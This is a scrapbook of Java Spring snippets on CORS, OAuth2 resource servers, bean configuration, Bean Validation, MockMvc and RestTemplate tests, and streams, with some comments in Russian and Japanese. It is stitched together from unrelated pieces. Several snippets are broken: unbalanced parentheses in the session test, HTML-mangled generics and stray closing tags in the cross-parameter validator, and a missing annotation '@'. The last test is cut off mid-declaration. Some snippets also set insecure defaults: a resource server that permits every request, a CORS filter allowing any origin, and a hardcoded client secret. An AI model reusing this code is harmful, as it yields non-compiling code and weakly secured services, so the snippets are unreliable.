public class ResourceWebConfig extends WebMvcConfigurerAdapter {

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        super.addCorsMappings(registry);
        registry.addMapping("/**")
                .allowedMethods("GET", "PUT", "POST", "DELETE", "OPTIONS");
    }
}
--------------------------------------------------------------------------------------------------------

    @PreAuthorize("#oauth2.hasScope('read')")
    @RequestMapping(method = RequestMethod.GET, value = "/beans/get/{paramId}")
    @ResponseBody
    public TestBean getBean(@PathVariable long paramId) {
        try {
            //полезная логика
            ...
            return testBean;
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Configuration;
import org.springframework.security.access.expression.method.MethodSecurityExpressionHandler;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableResourceServer;
import org.springframework.security.oauth2.provider.expression.OAuth2MethodSecurityExpressionHandler;

@Configuration
@EnableResourceServer
@EnableGlobalMethodSecurity(prePostEnabled = true)
public class MethodSecurityConfig extends GlobalMethodSecurityConfiguration {

    @Override
    protected MethodSecurityExpressionHandler createExpressionHandler() {
        return new OAuth2MethodSecurityExpressionHandler();
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.core.env.Environment;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableResourceServer;
import org.springframework.security.oauth2.config.annotation.web.configuration.ResourceServerConfigurerAdapter;
import org.springframework.security.oauth2.provider.token.RemoteTokenServices;

import javax.sql.DataSource;


@Configuration
@EnableResourceServer
@ConfigurationProperties(prefix = "datasource")
public class RestApiConfig extends ResourceServerConfigurerAdapter {

    private DataSource dataSource;

    private Environment environment;

    @Override
    public void configure(final HttpSecurity http) throws Exception {
        http.sessionManagement().sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
                .and()
                .authorizeRequests().anyRequest().permitAll();
    }

    @Bean
    @Primary
    public RemoteTokenServices tokenServices() {
        RemoteTokenServices tokenServices = new RemoteTokenServices();
        tokenServices.setClientId("myClientId");
        tokenServices.setClientSecret("mySecret");
        tokenServices.setCheckTokenEndpointUrl("http://localhost:8081/oauth/check_token");
        return tokenServices;
    }

    @Autowired
    public void setDataSource(DataSource dataSource) {
        this.dataSource = dataSource;
    }

    @Autowired
    public void setEnvironment(Environment environment) {
        this.environment = environment;
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;


@Component
@Order(Ordered.HIGHEST_PRECEDENCE)
public class CORSFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {

        HttpServletResponse response = (HttpServletResponse) res;
        HttpServletRequest request = (HttpServletRequest) req;
        response.setHeader("Access-Control-Allow-Origin", "*");
        response.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS, PUT,DELETE");
        response.setHeader("Access-Control-Max-Age", "3600");
        response.setHeader("Access-Control-Allow-Headers", "x-requested-with, authorization");
        if (!"OPTIONS".equals(request.getMethod())) {
            chain.doFilter(req, res);
        }
    }

    @Override
    public void destroy() {
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
public class AppConfig {

	@Bean
	public MyBean myBean() {
		return new MyBeanImpl();
	}

	@Bean({"myOtherBean", "beanNameTwo"})
	public MyBean myOtherBeanWithDifferentName() {
		return new MyOtherBeanImpl();
	}

}
--------------------------------------------------------------------------------------------------------
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
 
import javax.servlet.Filter;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;
import javax.servlet.FilterChain;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
 
@WebFilter(urlPatterns = "/api/count")
public class ExampleFilter implements Filter{
    private static final Logger logger = LoggerFactory.getLogger(ExampleFilter.class);
 
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
 
    }
 
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        logger.info("filter:"+ ((HttpServletRequest)servletRequest).getRequestURL());
        filterChain.doFilter(servletRequest, servletResponse);
    }
 
    @Override
    public void destroy() {
 
    }
}

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.web.servlet.ServletComponentScan;
import org.springframework.boot.web.support.SpringBootServletInitializer;
 
@ServletComponentScan
@SpringBootApplication
public class MyApplication extends SpringBootServletInitializer {
 
    public static void main(String[] args) throws Exception {
        SpringApplication.run(MyApplication.class, args);
    }
 
}
--------------------------------------------------------------------------------------------------------
package com.sensiblemetrics.api.common.validator.annotation.common;

import static java.lang.annotation.ElementType.ANNOTATION_TYPE;
import static java.lang.annotation.ElementType.TYPE;
import static java.lang.annotation.RetentionPolicy.RUNTIME;

import java.lang.annotation.Documented;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;

import javax.validation.Constraint;
import javax.validation.OverridesAttribute;
import javax.validation.Payload;
import javax.validation.ReportAsSingleViolation;

import org.terasoluna.gfw.common.validator.constraints.Compare;

@Documented
@Constraint(validatedBy = {})
@Target({ TYPE, ANNOTATION_TYPE }) // (1)
@Retention(RUNTIME)
@ReportAsSingleViolation // (2)
@Compare(left = "", right = "", operator = Compare.Operator.EQUAL, requireBoth = true) // (3)
public @interface Confirm {

    String message() default "{com.example.sample.domain.validation.Confirm.message}"; // (4)

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};

    @OverridesAttribute(constraint = Compare.class, name = "left") // (5)
    String field();

    @OverridesAttribute(constraint = Compare.class, name = "right") // (6)
    String confirmField();

    @Documented
    @Target({ TYPE, ANNOTATION_TYPE })
    @Retention(RUNTIME)
    public @interface List {
        Confirm[] value();
    }
}
--------------------------------------------------------------------------------------------------------
AnnotationConfigWebApplicationContext context = new AnnotationConfigWebApplicationContext();
context.register(ApplicationConfigurer.class); //ApplicationConfigurer imports HibernateConfigurer
--------------------------------------------------------------------------------------------------------
AnnotationConfigApplicationContext ctx = new AnnotationConfigApplicationContext();
ctx.getEnvironment().setActiveProfiles("dev");
ctx.register(SomeConfig.class, StandaloneDataConfig.class, JndiDataConfig.class);
ctx.refresh();
--------------------------------------------------------------------------------------------------------
@Override
public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {
    if (context.getEnvironment() != null) {
        // Читаем атрибуты аннотации @Profile
        MultiValueMap<String, Object> attrs = metadata.getAllAnnotationAttributes(Profile.class.getName());
        if (attrs != null) {
            for (Object value : attrs.get("value")) {
                if (context.getEnvironment().acceptsProfiles(((String[]) value))) {
                    return true;
                }
            }
            return false;
        }
    }
    return true;
}
--------------------------------------------------------------------------------------------------------
@Configuration
@ComponentScan
public class LessonsConfiguration {
    @Bean
    @Scope("prototype")
    public Object asyncCommand() {
        return new Object();
    }

    @Bean
    public CommandManager commandManager() {
        // возвращаем новую анонимную реализацию CommandManager
        // с новым объектом
        return new CommandManager() {
            protected Object createCommand() {
                return asyncCommand();
            }
        };
    }
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = "classpath:whereever/context.xml")
@TestPropertySource(properties = {"myproperty = foo"})
public class TestWarSpringContext {
    ...    
}
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = "classpath:whereever/context.xml")
public class TestWarSpringContext {

    static {
        System.setProperty("myproperty", "foo");
    }
}

@SpringBootTest
public class EnvironmentVariablesTest {
   @ClassRule
   public final EnvironmentVariables environmentVariables = new EnvironmentVariables().set("name", "value");

   @Test
   public void test() {
     assertEquals("value", System.getenv("name"));
   }
 }
 
public class TestApplicationContextInitializer implements ApplicationContextInitializer<ConfigurableApplicationContext>
{
    @Override
    public void initialize(ConfigurableApplicationContext applicationContext)
    {
        System.setProperty("myproperty", "value");
    }
}

@ContextConfiguration(initializers = TestApplicationContextInitializer.class, locations = "classpath:whereever/context.xml", ...)
@RunWith(SpringJUnit4ClassRunner.class)
public class SomeTest
{
...
}
--------------------------------------------------------------------------------------------------------
    @Test
    public void testLocalDateTimeCreate2() throws Exception {
        Clock clock = Clock.system(ZoneId.of("Europe/Moscow"));

        LocalDateTime ldt1 = LocalDateTime.ofInstant(clock.instant(), ZoneId.of("UTC"));
        System.out.println(ldt1);

        LocalDateTime ldt2 = LocalDateTime.now(clock);
        System.out.println(ldt2);
    }
	
    @Test
    public void testFormat() throws Exception {
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:dd z", Locale.ENGLISH);

        ZonedDateTime zdt1 = ZonedDateTime.of(2005, 10, 30, 0, 0, 0, 0, ZoneId.of("Europe/Moscow"));

        String text = zdt1.format(formatter);
        System.out.println(text);

        TemporalAccessor ta = formatter.parse(text); // java.time.format.Parsed
        ZonedDateTime zdt2 = ZonedDateTime.from(ta);

        Assert.assertEquals(zdt1, zdt2);
    }
--------------------------------------------------------------------------------------------------------
/*
 * Hibernate Validator, declare and validate application constraints
 *
 * License: Apache License, Version 2.0
 * See the license.txt file in the root directory or <http://www.apache.org/licenses/LICENSE-2.0>.
 */
package org.hibernate.validator.test.internal.engine.valuehandling;
 
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.Set;
import javax.validation.ConstraintViolation;
import javax.validation.Valid;
import javax.validation.Validator;
import javax.validation.constraints.Max;
import javax.validation.constraints.Min;
import javax.validation.executable.ExecutableValidator;
 
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
 
import org.hibernate.validator.testutil.TestForIssue;
import org.hibernate.validator.valuehandling.UnwrapValidatedValue;
 
import static org.hibernate.validator.testutil.ConstraintViolationAssert.assertCorrectConstraintTypes;
import static org.hibernate.validator.testutil.ConstraintViolationAssert.assertCorrectPropertyPaths;
import static org.hibernate.validator.testutil.ConstraintViolationAssert.assertNumberOfViolations;
import static org.hibernate.validator.testutils.ValidatorUtil.getValidator;
 
/**
 * Tests for {@link org.hibernate.validator.internal.engine.valuehandling.OptionalValueUnwrapper}.
 *
 * @author Khalid Alqinyah
 * @author Hardy Ferentschik
 */
public class OptionalValueUnwrapperTest {
 
    private Validator validator;
 
    @BeforeClass
    public void setup() {
        validator = getValidator();
    }
 
    @Test
    public void testOptionalUnwrappedValueViolations() {
        Set<ConstraintViolation<Foo>> constraintViolations = validator.validate( new Foo() );
        assertNumberOfViolations( constraintViolations, 2 );
        assertCorrectPropertyPaths(
                constraintViolations,
                "integerOptional",
                "optionalLong"
        );
        assertCorrectConstraintTypes( constraintViolations, Min.class, Max.class );
    }
 
    @Test
    public void testOptionalCascadedValidation() {
        Set<ConstraintViolation<Snafu>> constraintViolations = validator.validate( new Snafu() );
        assertNumberOfViolations( constraintViolations, 1 );
        assertCorrectPropertyPaths(
                constraintViolations,
                "barOptional.number"
        );
        assertCorrectConstraintTypes( constraintViolations, Min.class );
    }
 
    @Test
    public void testOptionalUnwrappedExecutableReturnValue() throws Exception {
        ExecutableValidator executableValidator = validator.forExecutables();
        Method method = Foo.class.getMethod( "getOptionalLong" );
        Set<ConstraintViolation<Foo>> constraintViolations = executableValidator.validateReturnValue(
                new Foo(),
                method,
                Optional.of( 9L )
        );
        assertNumberOfViolations( constraintViolations, 1 );
        assertCorrectPropertyPaths( constraintViolations, "getOptionalLong.<return value>" );
        assertCorrectConstraintTypes( constraintViolations, Max.class );
    }
 
    @Test
    public void testOptionalUnwrappedExecutableParameter() throws Exception {
        ExecutableValidator executableValidator = validator.forExecutables();
        Method method = Baz.class.getMethod( "setOptionalLong", Optional.class );
        Object[] values = { Optional.of( 2L ) };
        Set<ConstraintViolation<Baz>> constraintViolations = executableValidator.validateParameters(
                new Baz(),
                method,
                values
        );
        assertNumberOfViolations( constraintViolations, 1 );
        assertCorrectPropertyPaths( constraintViolations, "setOptionalLong.arg0" );
        assertCorrectConstraintTypes( constraintViolations, Min.class );
    }
 
    @Test
    public void testOptionalUnwrappedCascadableExecutableReturnValue() throws Exception {
        ExecutableValidator executableValidator = validator.forExecutables();
        Method method = Qux.class.getMethod( "getBar" );
        Set<ConstraintViolation<Qux>> constraintViolations = executableValidator.validateReturnValue(
                new Qux(),
                method,
                Optional.of( new Bar() )
        );
        assertNumberOfViolations( constraintViolations, 1 );
        assertCorrectPropertyPaths( constraintViolations, "getBar.<return value>.number" );
        assertCorrectConstraintTypes( constraintViolations, Min.class );
    }
 
    @Test
    public void testOptionalUnwrappedCascadableExecutableParameter() throws Exception {
        ExecutableValidator executableValidator = validator.forExecutables();
        Method method = Fubar.class.getMethod( "setBar", Optional.class );
        Object[] values = { Optional.of( new Bar() ) };
        Set<ConstraintViolation<Fubar>> constraintViolations = executableValidator.validateParameters(
                new Fubar(),
                method,
                values
        );
        assertNumberOfViolations( constraintViolations, 1 );
        assertCorrectPropertyPaths( constraintViolations, "setBar.arg0.number" );
        assertCorrectConstraintTypes( constraintViolations, Min.class );
    }
 
    @Test
    @TestForIssue(jiraKey = "HV-895")
    public void cascaded_validation_applies_for_elements_of_list_wrapped_in_optional() {
        Set<ConstraintViolation<Quux>> constraintViolations = validator.validate( new Quux() );
        assertNumberOfViolations( constraintViolations, 2 );
        assertCorrectPropertyPaths(
                constraintViolations,
                "bar[0].number",
                "bar[1].number"
        );
        assertCorrectConstraintTypes( constraintViolations, Min.class, Min.class );
    }
 
    @SuppressWarnings("unused")
    private class Foo {
        @Min(value = 5)
        Optional<Integer> integerOptional = Optional.of( 3 );
 
        @Max(value = 5)
        public Optional<Long> getOptionalLong() {
            return Optional.of( 7L );
        }
    }
 
    @SuppressWarnings("unused")
    private class Snafu {
        @Valid
        Optional<Bar> barOptional = Optional.of( new Bar() );
    }
 
    @SuppressWarnings("unused")
    private class Fubar {
        public void setBar(@UnwrapValidatedValue @Valid Optional<Bar> optionalBarPara) {
        }
    }
 
    @SuppressWarnings("unused")
    private class Qux {
        @Valid
        public Optional<Bar> getBar() {
            return Optional.empty();
        }
    }
 
    @SuppressWarnings("unused")
    private class Baz {
        public void setOptionalLong(@UnwrapValidatedValue @Min(5) Optional<Long> optionalLongPara) {
        }
    }
 
    @SuppressWarnings("unused")
    private class Bar {
        @Min(value = 5)
        int number = 3;
    }
 
    @SuppressWarnings("unused")
    private class Quux {
        @Valid
        public Optional<List<Bar>> getBar() {
            return Optional.of( Arrays.asList( new Bar(), new Bar() ) );
        }
    }
}
--------------------------------------------------------------------------------------------------------
public class ReservationManagement {
 
    @ValidReservation
    public Reservation getReservationsById(int id) {
        return null;
    }
}
@Constraint(validatedBy = ValidReservationValidator.class)
@Target({ METHOD, CONSTRUCTOR })
@Retention(RUNTIME)
@Documented
public @interface ValidReservation {
    String message() default "End date must be after begin date "
      + "and both must be in the future, room number must be bigger than 0";
 
    Class<?>[] groups() default {};
 
    Class<? extends Payload>[] payload() default {};
}
public class ValidReservationValidator
  implements ConstraintValidator<ValidReservation, Reservation> {
 
    @Override
    public boolean isValid(
      Reservation reservation, ConstraintValidatorContext context) {
 
        if (reservation == null) {
            return true;
        }
 
        if (!(reservation instanceof Reservation)) {
            throw new IllegalArgumentException("Illegal method signature, "
            + "expected parameter of type Reservation.");
        }
 
        if (reservation.getBegin() == null
          || reservation.getEnd() == null
          || reservation.getCustomer() == null) {
            return false;
        }
 
        return (reservation.getBegin().isAfter(LocalDate.now())
          && reservation.getBegin().isBefore(reservation.getEnd())
          && reservation.getRoom() > 0);
    }
}
public class Reservation {
 
    @ValidReservation
    public Reservation(
      LocalDate begin, 
      LocalDate end, 
      Customer customer, 
      int room) {
        this.begin = begin;
        this.end = end;
        this.customer = customer;
        this.room = room;
    }
 
    // properties, getters, and setters
}
@Configuration
@ComponentScan({ "org.baeldung.javaxval.methodvalidation.model" })
public class MethodValidationConfig {
 
    @Bean
    public MethodValidationPostProcessor methodValidationPostProcessor() {
        return new MethodValidationPostProcessor();
    }
}
--------------------------------------------------------------------------------------------------------
public class Car {

    @ParameterScriptAssert(lang = "javascript", script = "arg1.size() <= arg0.size() * 2")
    public void load(List<Person> passengers, List<PieceOfLuggage> luggage) {
        //...
    }
} 
--------------------------------------------------------------------------------------------------------
Car object = new Car( "Morris" );
Method method = Car.class.getMethod( "getPassengers" );
Object returnValue = Collections.<Passenger>emptyList();
Set<ConstraintViolation<Car>> violations = executableValidator.validateReturnValue(
        object,
        method,
        returnValue
);

assertEquals( 1, violations.size() );
Class<? extends Annotation> constraintType = violations.iterator()
        .next()
        .getConstraintDescriptor()
        .getAnnotation()
        .annotationType();
assertEquals( Size.class, constraintType );

Car object = new Car( "Morris" );
Method method = Car.class.getMethod( "drive", int.class );
Object[] parameterValues = { 80 };
Set<ConstraintViolation<Car>> violations = executableValidator.validateParameters(
        object,
        method,
        parameterValues
);

assertEquals( 1, violations.size() );
Class<? extends Annotation> constraintType = violations.iterator()
        .next()
        .getConstraintDescriptor()
        .getAnnotation()
        .annotationType();
assertEquals( Max.class, constraintType );


--------------------------------------------------------------------------------------------------------
public class Garage {

    @ELAssert(expression = "...", validationAppliesTo = ConstraintTarget.PARAMETERS)
    public Car buildCar(List<Part> parts) {
        //...
    }

    @ELAssert(expression = "...", validationAppliesTo = ConstraintTarget.RETURN_VALUE)
    public Car paintCar(int color) {
        //...
    }
}
--------------------------------------------------------------------------------------------------------
import static java.lang.annotation.ElementType.CONSTRUCTOR;
import static java.lang.annotation.ElementType.FIELD;
import static java.lang.annotation.ElementType.METHOD;
import static java.lang.annotation.ElementType.TYPE;
import static java.lang.annotation.RetentionPolicy.RUNTIME;
 
import java.lang.annotation.Documented;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
 
import javax.validation.Constraint;
import javax.validation.ConstraintValidator;
import javax.validation.ConstraintValidatorContext;
import javax.validation.Payload;
import javax.validation.constraintvalidation.SupportedValidationTarget;
import javax.validation.constraintvalidation.ValidationTarget;
 
/**
 * @author Gunnar Morling
 */
@Documented
@Constraint(validatedBy = CrossParameterConstraintWithObjectValidator.Validator.class)
@Target({ METHOD, CONSTRUCTOR, TYPE, FIELD })
@Retention(RUNTIME)
public @interface CrossParameterConstraintWithObjectValidator {
    String message() default "default message";
 
    Class<!--?-->[] groups() default { };
 
    Class<!--? extends Payload-->[] payload() default { };
 
    @SupportedValidationTarget(value = ValidationTarget.PARAMETERS)
    public static class Validator implements ConstraintValidator<crossparameterconstraintwithobjectvalidator, object=""> {
 
        @Override
        public boolean isValid(Object parameters, ConstraintValidatorContext constraintValidatorContext) {
            constraintValidatorContext.disableDefaultConstraintViolation();
            constraintValidatorContext.buildConstraintViolationWithTemplate( "violation created by validator for Object" )
                    .addConstraintViolation();
 
            return false;
        }
    }
}
</crossparameterconstraintwithobjectvalidator,></http:>
--------------------------------------------------------------------------------------------------------
public class BeanValidationTest {
 
 private Validator validator;
  
  @Before
  public void init() {
    // バリデータを生成する
    ValidatorFactory validatorFactory = Validation.buildDefaultValidatorFactory();
    validator = validatorFactory.getValidator();
  }
  
  @Test
  public void BeanValidationをListに設定する() {
    TestForm testForm = new TestForm();
    testForm.setUserIdList(Arrays.asList(123, 1234, 12345, 123456));
    
    // バリデーションを実施
    // バリデーション結果はviolationsに格納されるので、よしなに確認
    Set<ConstraintViolation<TestForm>> violations = validator.validate(testForm);
    assertThat(violations.size(), is(2));
  }
  
  /**
   * 試験対象フォーム
   */
  public class TestForm {
    
    public TestForm() {
      // 何もしない
    }

    @Valid
    private List<@DigitsTypeUse(integer = 4, fraction = 0) Integer> userIdList;

    public List<Integer> getUserIdList() {
      return userIdList;
    }

    public void setUserIdList(List<Integer> userIdList) {
      this.userIdList = userIdList;
    }
  }
}
--------------------------------------------------------------------------------------------------------
import java.util.Locale;

import org.springframework.context.MessageSource;
import org.springframework.context.MessageSourceAware;

public class CustomerService implements MessageSourceAware
{
	private MessageSource messageSource;
	
	public void setMessageSource(MessageSource messageSource) {
		this.messageSource = messageSource;
	}
	
	public void printMessage(){
		String name = messageSource.getMessage("customer.name", 
    			new Object[] { 28, "http://www.mkyong.com" }, Locale.US);

    	System.out.println("Customer name (English) : " + name);
    	
    	String namechinese = messageSource.getMessage("customer.name", 
    			new Object[] { 28, "http://www.mkyong.com" }, 
                        Locale.SIMPLIFIED_CHINESE);

    	System.out.println("Customer name (Chinese) : " + namechinese);
	}
	
}

--------------------------------------------------------------------------------------------------------
@Controller
@RequestMapping(value = "/api", produces = MimeTypeUtils.APPLICATION_JSON_VALUE)
public class LanguageApiController {
 
  private final LanguageService languageService;
 
  @Autowired
  public LanguageApiController(
      LanguageService languageService) {
    this.languageService = languageService;
  }
 
  @RequestMapping(value = "/languages", method = GET)
  public ResponseEntity<List<Language>> getLanguages(@RequestParam(value = "contains", required = false) String contains) {
    return ResponseEntity.ok(languageService.getLanguages(contains));
  }
 
  @RequestMapping(value = "/languages/{name}", method = GET)
  public ResponseEntity<Language> getLanguage(@PathVariable("name") String name) {
    return ResponseEntity.ok(languageService.getLanguage(name).orElseThrow(() -> new SpringMockMvcException(
        HttpStatus.NOT_FOUND, "Language was not found")));
  }
 
  @ExceptionHandler(SpringMockMvcException.class)
  public ResponseEntity<String> onSpringMockMvcException(HttpServletRequest request, SpringMockMvcException ex) {
    return ResponseEntity.status(ex.getHttpStatus()).body(String.format("%s - %s",
        ex.getHttpStatus().value(), ex.getMessage()));
  }
 
}
--------------------------------------------------------------------------------------------------------
Map<String, Integer> map = Stream.of(
  new AbstractMap.SimpleEntry<>("idea", 1), 
  new AbstractMap.SimpleEntry<>("mobile", 2))
  .collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue));
  
Map<String, String> map = Stream.of(new String[][] { 
    { "Hello", "World" }, 
    { "John", "Doe" },
}).collect(Collectors.collectingAndThen(
    Collectors.toMap(data -> data[0], data -> data[1]), 
    Collections::<String, String> unmodifiableMap));
--------------------------------------------------------------------------------------------------------
MvcResult mvcResult = super.mockMvc.perform(get("url").accept(MediaType.APPLICATION_JSON).headers(basicAuthHeaders()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$[0].id", is(6))).andReturn();

String response = mvcResult.getResponse().getContentAsString();
Integer id = JsonPath.parse(response).read("$[0].id");
--------------------------------------------------------------------------------------------------------
import static org.mockito.Matchers.any;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
import static org.springframework.test.web.servlet.setup.MockMvcBuilders.webAppContextSetup;
@RunWith(SpringRunner.class)
@SpringBootTest(classes={ Application.class })
public class AccountControllerTest {
  private MockMvc mockMvc;
  @Autowired
  private WebApplicationContext webApplicationContext;
  @MockBean 
  private AccountService accountServiceMock;
  @Before
  public void setUp() {
    this.mockMvc = webAppContextSetup(webApplicationContext).build();
  }
--------------------------------------------------------------------------------------------------------
mockMvc.perform(get("/api/users/" + id))
    .andExpect(status().isOk())
    .andExpect(content().string(org.hamcrest.Matchers.containsString("{\"id\":\"" + id + "\"}"))); 
--------------------------------------------------------------------------------------------------------
        //when
        final MvcResult result = this.mockMvc.perform(
                MockMvcRequestBuilders.post(uriTemplate)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(asString(ticketRequest))
                        .accept(MediaType.APPLICATION_JSON))
                .andDo(print())
                .andExpect(status().isOk())
                .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8))
                .andReturn();

        final String response = result.getResponse().getContentAsString();
        //final Integer id = JsonPath.parse(response).read("$.id");
--------------------------------------------------------------------------------------------------------
@Autowired
private WebApplicationContext wac;

@Autowired
private FilterChainProxy filterChain;

private MockMvc mockMvc;

@Before
public void setup() {
    this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac)
      .addFilter(filterChain).build();
}

@Test
public void testSession() throws Exception {
    // Login and save the cookie
    MvcResult result = mockMvc.perform(post("/session")
      .param("username", "john").param("password", "s3cr3t")).andReturn();
    Cookie c = result.getResponse().getCookie("my-cookie");
    assertThat(c.getValue().length(), greaterThan(10));

    // No cookie; 401 Unauthorized
    mockMvc.perform(get("/personal").andExpect(status().isUnauthorized());

    // With cookie; 200 OK
    mockMvc.perform(get("/personal").cookie(c)).andExpect(status().isOk());

    // Logout, and ensure we're told to wipe the cookie
    result = mockMvc.perform(delete("/session").andReturn();
    c = result.getResponse().getCookie("my-cookie");
    assertThat(c.getValue().length(), is(0));
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment=WebEnvironment.RANDOM_PORT)
@AutoConfigureMockMvc
public class SBTest {
    @Autowired
    private TestRestTemplate restTemplate;

    @Autowired
    private MockMvc mvc;

   // tests
}
--------------------------------------------------------------------------------------------------------
mockRestServiceServer.expect(requestTo("/number")).andExpect(method(HttpMethod.GET))
    .anyNumberOfTimes()
    .andRespond(withSuccess("1", MediaType.TEXT_PLAIN));
	
mockRestServiceServer.expect(requestTo("/number")).andExpect(method(HttpMethod.GET))
    .times(2)
    .andRespond(withSuccess("4", MediaType.TEXT_PLAIN));
--------------------------------------------------------------------------------------------------------
@Service
public class DetailsServiceClient {
 
    private final RestTemplate restTemplate;
 
    public DetailsServiceClient(RestTemplateBuilder restTemplateBuilder) {
        restTemplate = restTemplateBuilder.build();
    }
 
    public Details getUserDetails(String name) {
        return restTemplate.getForObject("/{name}/details",
          Details.class, name);
    }
}
RunWith(SpringRunner.class)
@RestClientTest(DetailsServiceClient.class)
public class DetailsServiceClientTest {
 
    @Autowired
    private DetailsServiceClient client;
 
    @Autowired
    private MockRestServiceServer server;
 
    @Autowired
    private ObjectMapper objectMapper;
 
    @Before
    public void setUp() throws Exception {
        String detailsString = 
          objectMapper.writeValueAsString(new Details("John Smith", "john"));
         
        this.server.expect(requestTo("/john/details"))
          .andRespond(withSuccess(detailsString, MediaType.APPLICATION_JSON));
    }
 
    @Test
    public void whenCallingGetUserDetails_thenClientMakesCorrectCall() 
      throws Exception {
 
        Details details = this.client.getUserDetails("john");
 
        assertThat(details.getLogin()).isEqualTo("john");
        assertThat(details.getName()).isEqualTo("John Smith");
    }
}
--------------------------------------------------------------------------------------------------------
    @Test
    public void testGetMessage_500() {
        mockServer.expect(requestTo("http://google.com"))
                .andExpect(method(HttpMethod.GET))
                .andRespond(withServerError());

        String result = simpleRestService.getMessage();

        mockServer.verify();
        assertThat(result, allOf(containsString("FAILED"),
                       containsString("500")));
    }
	    @Test
    public void testGetMessage_404() {
        mockServer.expect(requestTo("http://google.com"))
                .andExpect(method(HttpMethod.GET))
                .andRespond(withStatus(HttpStatus.NOT_FOUND));

        String result = simpleRestService.getMessage();

        mockServer.verify();
        assertThat(result, allOf(containsString("FAILED"),
                       containsString("404")));
    }
	
	    @Test
    public void testGetMessage() {
        mockServer.expect(requestTo("http://google.com"))
                .andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess("resultSuccess", MediaType.TEXT_PLAIN));

        String result = simpleRestService.getMessage();

        mockServer.verify();
        assertThat(result, allOf(containsString("SUCCESS"),
                       containsString("resultSuccess")));
    }
--------------------------------------------------------------------------------------------------------
    public static void main (String[] args) {
        final int[] ints = IntStream.range(0, 5).toArray();
        PerformanceTestUtil.runTest("forEach() method", () -> {
            Arrays.stream(ints).parallel().forEach(i -> doSomething(i));
        });

        PerformanceTestUtil.runTest("forEachOrdered() method", () -> {
            Arrays.stream(ints).parallel().forEachOrdered(i -> doSomething(i));
        });
    }
	
	public class SideEffectWrongUse {

    public static void main (String[] args) {
        List<Integer> results = new ArrayList<>();
        IntStream.range(0, 150)
                 .parallel()
                 .filter(s -> s % 2 == 0)
                 .forEach(s -> results.add(s));//stateful side effect
        //not thread safe
        System.out.println(results);
    }
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = {"classpath*:/test-dao-rest.xml"})
public class TestEmployeeRestDao {

  @Autowired
  private EmployeeDao employeeRestDao;

  @Autowired
  private RestTemplate mockRestTemplate;

  private MockRestServiceServer mockServer;

  /**
   * Sets up.
   */
  @Before
  public void setUp() {
    mockServer = MockRestServiceServer.bindTo(mockRestTemplate).build();
  }

  @Test
  public void testGetEmployeeById() {
    when(mockRestTemplate.getForObject(url + 1, Employee.class)).thenReturn(emp2);
    mockServer.expect(times(1), requestTo(url + 1))
        .andExpect(method(HttpMethod.GET))
    Employee employee = employeeRestDao.getEmployeeById(1L);
    assertNotNull(employee);
    mockServer.verify();
  }
--------------------------------------------------------------------------------------------------------
public class OtherJUnit4Test {

  @Rule
  public final TemporaryFolder folder = new TemporaryFolder();

  @Rule
  public final Timeout timeout = new Timeout(1000);

  @Rule
  public final ExpectedException thrown = ExpectedException.none();

  @Ignore
  @Test
  public void anotherInfinity() {
    while (true);
  }

  @Test
